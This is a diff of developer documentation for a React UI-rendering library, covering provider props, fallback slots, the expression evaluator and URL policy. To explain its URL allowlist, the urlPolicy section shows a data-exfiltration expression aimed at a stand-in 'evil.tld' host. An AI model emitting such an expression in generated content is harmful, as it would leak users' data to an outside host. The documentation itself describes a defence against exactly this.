@@ -1,14 +1,9 @@
 # Renderer
 
-Two pieces, both from `@uicast/react`.
-
-`<RendererProvider>` is the **host side**: your
-[implementations](/react), your [host functions](/expr/functions), the engine's
-fallback UI, and one shared reactive store for everything beneath it.
-
-`<EntriesRenderer>` is the **mount point**: give it [entries](/entry) and it
-renders them, evaluating every expression against that store and re-rendering as
-state changes. In a server pass it does the same on the server; see
+`<RendererProvider>` holds your [implementations](/react), the evaluator with
+your [host functions](/expr/functions), the fallback UI and one reactive store.
+`<EntriesRenderer>` renders [entries](/entry) against that store and re-renders
+as state changes. In a server pass it does the same on the server; see
 [Server rendering](/react/ssr).
 
 ## Mounting a document
@@ -29,14 +24,9 @@ const entries = [
 </RendererProvider>;
 ```
 
-The provider builds the `name → implementation` lookup and creates the group's
-**root scope**. The renderer walks the entries in
-tree order and mounts each one.
-
 ## One store, many renderers
 
-Every `<EntriesRenderer>` under the same provider renders against the **same
-`root` scope**:
+The renderers under one provider form a **group** and share one `root` scope:
 
 ```tsx
 <RendererProvider implementations={impls} evaluator={evaluator}>
@@ -58,39 +48,34 @@ Every `<EntriesRenderer>` under the same provider renders against the **same
   "props": { "expr": "({ label: 'Orders', value: scopes.root.orderCount })" } }
 ```
 
-The Stat shows `1`, not `0`: [`seed`](/entry#seed) is first-writer-wins,
-so the second block's seed leaves what the first wrote. Click the button and it
-shows `2`.
+The Stat shows `1`, not `0`: [`seed`](/entry#seed) is first-writer-wins, so the
+second seed keeps what the first wrote.
 
-This is why the fence prompt makes every block seed everything it reads — a
-no-op beside a block that already seeded it, and the block still works on its
-own. Each ```` ```uicast ```` block is its own `<EntriesRenderer>` (see
-[Streamdown plugin](/streamdown)).
-
-To isolate documents instead, give each its own provider.
+The [Streamdown plugin](/streamdown) relies on this: each ```` ```uicast ````
+block is its own `<EntriesRenderer>`, and every block seeds everything it reads.
+To isolate documents, give each its own provider.
 
 ## `RendererProvider` props
 
-- **`implementations`** — the [`ComponentImplementation`](/react) array,
-  partner to the def [registration](/def#registration). A duplicate `name`
-  throws. To replace a catalog component, filter its name out of both arrays
-  rather than appending over it.
-- **`evaluator`** — the expression evaluator, with your host functions bound
-  on it: `new Evaluator({ functions })` from `@uicast/expr`. See
-  [below](#evaluator--the-expression-evaluator) and [Host functions](/expr/functions).
-- **`fallbackComponents`** *(optional)* — the engine's fallback UI; see
+- **`implementations`**: the [implementations](/react), matching the
+  [definitions](/def#registration). A duplicate name throws. To replace a
+  catalog component, filter its name out of both arrays.
+- **`evaluator`**: runs every expression, with your host functions bound; see
+  [below](#evaluator--the-expression-evaluator).
+- **`urlPolicy`** *(optional)*: which URLs may reach a prop the definition
+  declares as a URL; see [below](#urlpolicy--the-urls-a-document-may-load).
+- **`fallbackComponents`** *(optional)*: the UI the engine draws itself; see
   [below](#fallbackcomponents--the-engines-fallback-ui).
-- **`init`** *(optional)* — a one-shot side effect for the whole group: preload
-  the state documents read, and optionally
-  [expose extra named scopes](#extra-named-scopes) beyond `root`. See
+- **`init`** *(optional)*: preloads state once for the group and can add
+  [named scopes](#extra-named-scopes); see
   [below](#init--preload-state-for-the-group) and
   [State &amp; Scopes](/entry/state).
-- **`onError`** *(optional)* — called once per classified failure: everything the
-  `error` slot shows, **plus callback failures**, which render no slot at all. See
+- **`onError`** *(optional)*: called once per classified failure: everything the
+  error slot shows, plus callback failures, which render no slot. See
   [Error recovery](/error-recovery#classification-entryerror-and-onerror).
 
-`<EntriesRenderer>` takes one prop, **`entries`**, memoized on the array
-reference — so a streaming line must arrive as a new array:
+`<EntriesRenderer>` takes one prop, `entries`, memoized on the array reference,
+so each streamed entry must arrive in a new array:
 
 ```tsx
 setEntries((prev) => [...prev, next]); // ✅ new reference — the line mounts
@@ -98,26 +83,25 @@ entries.push(next); //                    ❌ same reference — nothing renders
 ```
 
 Settled subtrees do not re-render as later entries arrive. `<EntriesRenderer>`
-throws if rendered outside a `<RendererProvider>`.
+throws outside a `<RendererProvider>`.
 
 ### Pass stable references
 
-`implementations` and `functions` feed a context whose identity must stay stable,
-or **every element re-renders**. Use module constants:
+`implementations` and `evaluator` must keep their identity across renders, or
+**every element re-renders**. Use module constants:
 
 ```tsx
-const implementations = [...impls, MyCard]; // ✅ module scope
-const functions = [listRows, deleteRow]; //                 ✅ module scope
+const implementations = [...impls, MyCard];                            // ✅ module scope
+const evaluator = new Evaluator({ functions: [listRows, deleteRow] }); // ✅ module scope
 
 // ❌ a fresh array each render — every node under it re-renders
 <RendererProvider evaluator={evaluator} implementations={[...impls, MyCard]}>…</RendererProvider>;
 ```
 
-### `functions` — callable from `seed` and `callbacks`
+### Host functions — only in `seed` and `callbacks`
 
-Host functions appear in expressions as **bare identifiers**, called as
-`name(input)`, and only in [`seed`](/entry#seed) and
-[`callbacks`](/entry#callbacks):
+A host function is a bare identifier in an expression, called as `name(input)`,
+and only in [`seed`](/entry#seed) and [`callbacks`](/entry#callbacks):
 
 ```jsonc
 { "key": "grid", "component": "DataGrid",
@@ -129,8 +113,8 @@ Host functions appear in expressions as **bare identifiers**, called as
   ] } }
 ```
 
-`props` and `hidden` evaluate synchronously, so the same call in `props` hands
-the component a Promise instead of rows, and re-fires on every render:
+`props`, `hidden`, `loading` and `each` evaluate synchronously, so a host call
+there is refused, and the element shows its error slot (`guardrail-violation`):
 
 ```jsonc
 // ❌
@@ -140,18 +124,14 @@ the component a Promise instead of rows, and re-fires on every render:
 
 ### `fallbackComponents` — the engine's fallback UI
 
-The slots the engine renders itself, as opposed to `implementations`, which the
-model names. Three:
-
-| Slot | Rendered when | Default if omitted |
+| Slot | Rendered when | Default |
 |---|---|---|
-| `placeholder` | a child hasn't streamed in yet, an async [`seed`](/entry#seed) is resolving, or an async `init` is still pending (that one covers the whole group) | nothing — the pending element stays empty |
-| `confirm` | a callback step carries `confirm:` — the modal that gates it | `window.confirm` |
-| `error` | any element-level failure: an implementation throws, an expression fails, an entry is misused as a list, or its `component` has no implementation | bare inline-styled `div` |
+| `placeholder` | a child has not streamed in, an async [`seed`](/entry#seed) is resolving, or an async `init` is pending (for the whole group) | nothing |
+| `confirm` | a callback step has `confirm:` | `window.confirm` |
+| `error` | any element-level failure: an implementation throws, an expression fails, an entry is misused as a list, or its `component` has no implementation | a plain inline-styled `div` |
 
-Each is optional. The built-in `confirm` and `error` keep the engine renderable
-with **zero UI dependencies**; the catalog ships nicer ones you wire in
-yourself:
+The defaults need no UI library. The
+[reference catalog](/react/reference-catalog) has styled ones:
 
 ```tsx
 import { EntriesRenderer, RendererProvider } from "@uicast/react";
@@ -171,16 +151,14 @@ import { Skeleton } from "@uicast/shadcn-catalog/ui/skeleton";
 </RendererProvider>;
 ```
 
-Each slot receives props. `placeholder` gets a `reason` — why it is showing, so
-you can draw a skeleton while data loads but nothing while a slot streams in.
-`confirm` and `error` carry their payloads. All three types are exported from
-`@uicast/react`:
+Their props types are exported from `@uicast/react`:
 
 ```ts
 type PlaceholderComponentProps = {
   reason: "streaming" | "seeding";
   //       │             └─ the entry is here, its async `seed` / `init` is resolving
   //       └─ the entry has not streamed in yet
+  children?: ReactNode; // present when a caller such as a skeleton draws the element: render your own tag around them
 };
 
 type ConfirmComponentProps = {
@@ -196,9 +174,9 @@ type ErrorComponentProps = {
 };
 ```
 
-Every failure arrives as an
-[`EntryError`](/error-recovery#classification-entryerror-and-onerror), including
-an unknown component name, so one component can branch on it:
+Every failure, an unknown component included, is an
+[`EntryError`](/error-recovery#classification-entryerror-and-onerror) to branch
+on:
 
 ```tsx
 const ErrorSlot = ({ error, elementKey }: ErrorComponentProps) => {
@@ -211,12 +189,10 @@ const ErrorSlot = ({ error, elementKey }: ErrorComponentProps) => {
 };
 ```
 
-`regenerate` is your app's re-emission trigger — see
-[Error recovery](/error-recovery).
+`regenerate` is yours; see [Error recovery](/error-recovery).
 
-`confirm` is a **controlled** dialog: always mounted, shown by `open`, so your
-component holds no state of its own. A callback step carrying `confirm:` opens
-it:
+`confirm` is controlled by `open`, so your component needs no state of its own.
+A step with `confirm:` opens it:
 
 ```jsonc
 { "key": "delete", "component": "Button",
@@ -227,12 +203,12 @@ it:
   ] } }
 ```
 
-Cancel and neither step runs — a `confirm` step is a barrier.
+On cancel, neither step runs.
 
 ### `evaluator` — the expression evaluator
 
 Every expression under the provider runs on this instance. Create it once,
-outside render — it holds the parse cache — and bind the host functions on it:
+outside render: it holds the parse cache.
 
 ```tsx
 import { Evaluator } from "@uicast/expr";
@@ -248,38 +224,32 @@ const evaluator = new Evaluator({
 </RendererProvider>;
 ```
 
-`Evaluator` checks each read and call at run time and needs no CSP
-`unsafe-eval` — the choice for any document you did not author yourself. For
-documents from a trusted author, a [custom evaluator](/expr/custom-expr) runs the
-same expressions with `new Function`.
+`Evaluator` checks every read and call at run time and needs no CSP
+`unsafe-eval`. A [custom evaluator](/expr/custom-expr) runs the same
+expressions with `new Function`, for documents from a trusted author only.
 
-The prop is typed as `ExpressionEvaluator`, the interface from `@uicast/expr`
-that `Evaluator` implements (`@uicast/core` re-exports it). An evaluator for
-another language, with its own prompt, implements it and plugs in the same
-way.
+The prop is typed `ExpressionEvaluator` (exported by `@uicast/expr` and
+`@uicast/core`); an evaluator for another language, with its own prompt, can
+implement it.
 
 ### Expression length
 
-One expression may be at most `maxSourceLength` characters — 1000 by default,
-rejected before parsing. It is an option of the evaluator, not the provider.
-Pass the same value to `getExpressionsPartialPrompt({ maxLength })` so the
-model is told the limit it generates under.
+An expression may be at most `maxSourceLength` characters (1000 by default);
+a longer one is rejected before parsing. Pass the same value to
+`getExpressionsPartialPrompt({ maxLength })`.
 
 ### `urlPolicy` — the URLs a document may load
 
-A prop the definition declares as a URL (`z.url()`) is a destination the
-browser fetches on render — `<img src>` issues the GET with no interaction. An
-expression building
-`"https://evil.tld/?d=" + JSON.stringify(scopes.root.rows)` is perfectly legal
-JavaScript, so the [evaluator](/expr) rightly allows it; the danger is
-the destination, and this policy gates it. The check runs after props parse
-and before the implementation sees them.
+`urlPolicy` checks every prop the definition declares as a URL (`z.url()`),
+after props parse and before the implementation sees them. The
+[evaluator](/expr) allows
+`"https://evil.tld/?d=" + JSON.stringify(scopes.root.rows)`, a valid
+expression, and `<img src>` fetches it on render, with no click.
 
-Without configuration the policy is strict: **relative URLs, same-origin
-absolute URLs, raster `data:` images** (never SVG — it can carry script), and
-inert schemes (`mailto:`, `tel:`) pass; every other destination is rejected
-and the element renders the [error slot](#fallbackcomponents--the-engines-fallback-ui)
-instead.
+By default only relative URLs, same-origin absolute URLs, raster `data:` images
+(never SVG, which can carry script) and inert schemes (`mailto:`, `tel:`, `sms:`, `blob:`) pass.
+Anything else fails the element into the
+[error slot](#fallbackcomponents--the-engines-fallback-ui).
 
 To allow more, pass an object or a predicate:
 
@@ -295,15 +265,13 @@ To allow more, pass an object or a predicate:
 
 | Field | Default | |
 | --- | --- | --- |
-| `allowRelative` | `true` | `/a`, `a/b`, `?q=1`, `#x`. `//host/a` and `\\host/a` name a host, so they are checked as absolute URLs |
+| `allowRelative` | `true` | `/a`, `a/b`, `?q=1`, `#x`; `//host/a` and `\\host/a` count as absolute |
 | `allowSameOrigin` | `true` | Absolute URLs on the page origin |
 | `hosts` | `[]` | Extra hosts over http/https; `*.example.com` matches subdomains only |
-| `allowDataImages` | `true` | `data:` raster images; `image/svg+xml` stays out regardless |
-| `origin` | `location.origin` | Set explicitly where there is no `location` (SSR) |
+| `allowDataImages` | `true` | `data:` raster images; never `image/svg+xml` |
+| `origin` | `location.origin` | Set it where there is no `location` (SSR) |
 
-A function form — `urlPolicy={(url) => boolean}` — replaces the rules
-entirely. The rejection message names the failing prop and, when a host is the
-issue, the exact `hosts` entry that would allow it.
+A predicate, `urlPolicy={(url) => boolean}`, replaces these rules.
 
 ### `init` — preload state for the group
 
@@ -324,17 +292,15 @@ const init: InitFn = async ({ scopes }) => {
 </RendererProvider>;
 ```
 
-Every entry under it can read `scopes.root.user.name` on its first render. A
-returned Promise suspends the group, which shows the
+A returned Promise suspends the group, which shows the
 [`placeholder` slot](#fallbackcomponents--the-engines-fallback-ui) until it
 resolves.
 
 ### Extra named scopes
 
-`init` can also expose scopes beyond `root`. Build one with
-[`createProxyScope`](/api-ref#uicastcore) above the provider — so you keep the
-handle — and assign it onto the `scopes` object `init` receives; it is present
-before any entry evaluates:
+`init` can add scopes beyond `root`. Create one with
+[`createProxyScope`](/api-ref#uicastcore), keep the handle, and assign it onto
+the `scopes` object `init` receives:
 
 ```tsx
 import { createProxyScope } from "@uicast/core";
@@ -350,22 +316,19 @@ const init: InitFn = ({ scopes }) => {
 </RendererProvider>;
 ```
 
-An entry reads it exactly like `root`:
+An entry reads it like `root`:
 
 ```jsonc
 { "key": "hello", "component": "Typography",
   "props": { "expr": "({ text: 'Hi ' + scopes.userCtx.name })" } }
 ```
 
-Because you hold `userCtx`, host code can update it whenever —
-`userCtx.plan = "free"` — and every document reading it re-renders. That is the
-reason to inject a scope rather than just seed `scopes.root` in `init`: a living
-handle the host can drive from outside a document.
+Host code can write to the handle at any time (`userCtx.plan = "free"`), and
+every document reading it re-renders.
 
-**Tell the model it exists.** No prompt builder knows about a scope you inject,
-so a model never told about it will never emit `scopes.userCtx`. Declare it with
-`getCommonInstructionsPartialPrompt`'s `note`, rendered as a `## Note` right
-under the prompt's `# Expression Context` section:
+**Tell the model about it**: no prompt builder knows the scope. Describe it in
+`getCommonInstructionsPartialPrompt`'s `note`, printed as a `## Note` under the
+prompt's `# Expression Context`:
 
 ```ts
 getCommonInstructionsPartialPrompt({
@@ -373,11 +336,10 @@ getCommonInstructionsPartialPrompt({
 });
 ```
 
-Nothing checks that the note and the object agree. Keep them in step yourself.
+Nothing checks that the note matches the scope; keep them in sync.
 
 ## Where to go next
 
 - [Component implementation](/react) — the `implementations` you pass in.
 - [Entry fields](/entry) — the `entries` the renderer mounts.
 - [The expression evaluator](/expr) — what runs inside an entry.
-- [Custom evaluator](/expr/custom-expr) — running expressions with `new Function`.
